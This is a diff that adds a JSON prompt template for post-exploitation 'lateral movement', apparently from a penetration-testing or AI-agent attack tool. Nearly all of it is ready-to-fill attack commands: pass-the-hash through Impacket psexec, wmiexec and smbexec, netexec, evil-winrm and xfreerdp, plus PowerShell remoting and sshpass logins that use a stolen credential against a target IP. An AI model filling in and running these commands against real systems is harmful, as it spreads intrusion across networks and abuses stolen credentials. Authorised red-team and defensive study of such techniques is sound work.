@@ -1,0 +1,11 @@
+{
+  "name": "Lateral Movement",
+  "description": "Lateral movement techniques",
+  "category": "post",
+  "variables": [
+    "target_ip",
+    "username",
+    "credential"
+  ],
+  "content": "Perform lateral movement to {target_ip} with {username}.\n\n**Pass-the-Hash (Windows) :**\n```bash\n# Impacket\nimpacket-psexec -hashes :{credential} {username}@{target_ip}\nimpacket-wmiexec -hashes :{credential} {username}@{target_ip}\nimpacket-smbexec -hashes :{credential} {username}@{target_ip}\n\n# netexec\nnetexec smb {target_ip} -u {username} -H {credential} -x \"whoami\"\n```\n\n**WinRM :**\n```bash\nevil-winrm -i {target_ip} -u {username} -H {credential}\n```\n\n**PSRemoting :**\n```powershell\n$cred = New-Object PSCredential('{username}', (ConvertTo-SecureString '{credential}' -AsPlainText -Force))\nEnter-PSSession -ComputerName {target_ip} -Credential $cred\n```\n\n**RDP :**\n```bash\nxfreerdp /v:{target_ip} /u:{username} /pth:{credential}\n```\n\n**Linux :**\n```bash\nssh {username}@{target_ip}\nsshpass -p '{credential}' ssh {username}@{target_ip}\n```"
+}
